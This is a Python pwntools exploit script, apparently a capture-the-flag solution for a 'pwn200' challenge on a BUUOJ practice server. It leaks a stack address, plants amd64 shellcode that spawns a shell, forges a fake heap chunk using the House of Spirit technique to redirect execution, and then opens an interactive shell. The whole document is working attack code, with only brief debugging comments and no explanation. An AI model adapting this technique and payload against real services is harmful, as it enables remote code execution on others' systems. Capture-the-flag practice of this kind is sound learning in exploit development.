# -*- coding: utf-8 -*-
from pwn import *
from LibcSearcher import *
# sh = process("./pwn200")
sh = remote("node4.buuoj.cn",25187)
def leak():
    global fakechunk_addr, shellcode_addr
    shellcode = asm(shellcraft.amd64.linux.sh(), arch="amd64")
    payload = shellcode.rjust(48, b'A')

    sh.sendafter("who are u?", payload) # sendline is wrong here

    sh.recvuntil(payload)
    
    rbp_addr = u64(sh.recvn(6).ljust(8, b"\x00"))
    log.info("rbp_addr addr: " + hex(rbp_addr))
    # gdb.attach(sh)
    # pause()
    shellcode_addr = rbp_addr - 0x20 - len(shellcode)
    fakechunk_addr = rbp_addr - 0x20 - 0x30 - 0x40  # fakechunk.size = 0x40
    log.info("shellcode addr: " + hex(shellcode_addr))
    log.info("fakechunk addr: " + hex(fakechunk_addr))

def houseofspirit():
    global fake_addr, shellcode_addr
    sh.sendlineafter("give me your id ~~?", '33')

    fake_chunk = p64(0) * 5
    fake_chunk += p64(0x41)
    fake_chunk += p64(0)
    fake_chunk += p64(fakechunk_addr)

    sh.sendafter("give me money~", fake_chunk)


    sh.sendlineafter("choice : ", '2')
    sh.sendlineafter("choice : ", '1')
    sh.sendlineafter("long?", "48")

    payload = b"A" * 0x18
    payload += p64(shellcode_addr)
    payload = payload.ljust(48, b'\x00')
    sh.sendafter("48", payload)
    
    sh.sendlineafter("choice", "3")
    sh.interactive()


if __name__ == "__main__":
    leak()
    houseofspirit()